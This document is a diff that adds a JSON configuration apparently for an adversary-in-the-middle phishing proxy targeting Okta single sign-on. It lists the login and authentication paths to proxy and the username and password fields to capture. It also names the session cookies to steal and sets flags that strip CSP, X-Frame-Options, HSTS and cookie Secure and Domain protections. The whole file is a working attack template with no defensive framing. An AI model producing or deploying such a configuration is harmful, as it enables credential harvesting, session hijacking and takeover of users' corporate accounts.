@@ -1,0 +1,33 @@
+{
+  "name": "okta",
+  "label": "Okta SSO",
+  "upstream": "okta.com",
+  "proxy_paths": [
+    "/",
+    "/login/",
+    "/sso/",
+    "/api/v1/authn",
+    "/oauth2/",
+    "/authorize",
+    "/signin/"
+  ],
+  "credential_fields": {
+    "username": ["identifier", "username", "login", "email"],
+    "password": ["password", "passwd", "credentials.passcode"]
+  },
+  "session_cookies": [
+    "sid",
+    "DT",
+    "JSESSIONID",
+    "okta_session",
+    "tkn"
+  ],
+  "rewrite": {
+    "strip_csp": true,
+    "strip_xfo": true,
+    "strip_hsts": true,
+    "strip_cookie_secure": true,
+    "strip_cookie_domain": true,
+    "rewrite_location": true
+  }
+}
